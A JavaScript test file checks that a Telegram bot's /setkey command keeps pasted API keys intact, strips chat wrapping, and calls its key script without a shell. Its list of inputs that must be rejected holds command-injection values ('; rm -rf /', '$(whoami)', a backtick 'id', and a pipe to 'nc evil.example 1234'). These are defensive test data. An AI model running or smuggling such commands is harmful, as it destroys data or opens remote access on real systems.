// tests/api-key.test.mjs — /setkey must not rewrite a pasted API key (no network).
//
// Guards the bug that rejected two valid Google keys: the bot stripped every
// non-alphanumeric character, so `AQ.Ex4mpl3…` was validated as `AQEx4mpl3…`,
// Google answered "API key not valid", and the user was told it was a network
// problem.
import { pass, fail, ROOT } from './helpers.mjs';
import { join } from 'path';
import { pathToFileURL } from 'url';
import { readFileSync } from 'fs';

console.log('\nAPI key handling — lib/api-key.mjs');

try {
  const { cleanKey, isPlausibleApiKey } = await import(pathToFileURL(join(ROOT, 'lib', 'api-key.mjs')).href);

  // Real-world key SHAPES (not real keys) for every provider /setkey accepts.
  const keys = {
    'Gemini (AI Studio, new format)': 'AQ.Ex4mpl3_N0tAR3alK3y-abcdefghijklmnopqrstuvwx012345',
    'Gemini (legacy AIza format)': 'AIzaSyB1-2c_D3efGH4ijkLmN5opQrsTuvWxYz0',
    'Hunter.io (hex)': '0123456789abcdef0123456789abcdef01234567',
    'SerpApi (hex)': 'fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210',
  };

  let intact = 0;
  for (const [label, key] of Object.entries(keys)) {
    const out = cleanKey(key);
    if (out === key && isPlausibleApiKey(out)) intact++;
    else fail(`${label}: key altered or rejected — "${key}" → "${out}" (accepted=${isPlausibleApiKey(out)})`);
  }
  if (intact === Object.keys(keys).length) pass(`all ${intact} provider key formats survive verbatim`);

  // The specific character class the old sanitizer destroyed.
  const dotted = 'AQ.Ex4mpl3_x-y~z+a/b=c0123456789';
  if (cleanKey(dotted) === dotted && isPlausibleApiKey(dotted)) pass('dots, underscores, dashes and base64url padding preserved');
  else fail(`"${dotted}" → "${cleanKey(dotted)}"`);

  // Chat wrapping is stripped; the key itself is not.
  const wrapped = [['  AQ.Ex4mpl3_N0tAR3alK3y-abcdefgh  ', 'whitespace'],
    ['<AQ.Ex4mpl3_N0tAR3alK3y-abcdefgh>', 'angle brackets (copied placeholder)'],
    ['"AQ.Ex4mpl3_N0tAR3alK3y-abcdefgh"', 'double quotes'],
    ['`AQ.Ex4mpl3_N0tAR3alK3y-abcdefgh`', 'backticks (Markdown paste)']];
  let unwrapped = 0;
  for (const [raw, label] of wrapped) {
    if (cleanKey(raw) === 'AQ.Ex4mpl3_N0tAR3alK3y-abcdefgh') unwrapped++;
    else fail(`${label} not stripped: "${cleanKey(raw)}"`);
  }
  if (unwrapped === wrapped.length) pass('chat wrapping (quotes, brackets, backticks, spaces) stripped');

  // Rejections: too short, and anything a shell could reinterpret.
  const bad = ['short', '', 'AQ.Ex4mpl3; rm -rf /', 'key with spaces here 12345678', 'AQ.Ab$(whoami)0123456789abc',
    'AQ.Ex4mpl3`id`0123456789abcdef', 'AQ.Ab8|nc evil.example 1234'];
  const leaked = bad.filter((b) => isPlausibleApiKey(cleanKey(b)));
  if (leaked.length === 0) pass('short keys and shell metacharacters rejected');
  else fail(`accepted unsafe input: ${JSON.stringify(leaked)}`);

  // --- wiring guard: the bot must not reintroduce the destructive strip -----
  const bot = readFileSync(join(ROOT, 'telegram-bot.mjs'), 'utf-8');
  if (!/replace\(\/\[\^A-Za-z0-9\]\/g/.test(bot)) pass('telegram-bot.mjs no longer strips non-alphanumerics from keys');
  else fail('telegram-bot.mjs still rewrites the key before validating it');

  if (/execFileAsync\(\s*process\.execPath,\s*\[[^\]]*set-key\.mjs/s.test(bot))
    pass('/setkey passes the key via execFile argv (no shell re-parsing)');
  else fail('/setkey should call set-key.mjs through execFile, not a shell string');

  // set-key.mjs must hand the real reason back to the bot.
  const setKey = readFileSync(join(ROOT, 'set-key.mjs'), 'utf-8');
  if (setKey.includes('KEY_ERROR')) pass('set-key.mjs emits KEY_ERROR with the provider\'s actual message');
  else fail('set-key.mjs swallows the rejection reason');
} catch (err) {
  fail(`api-key test crashed: ${err.message}`);
}
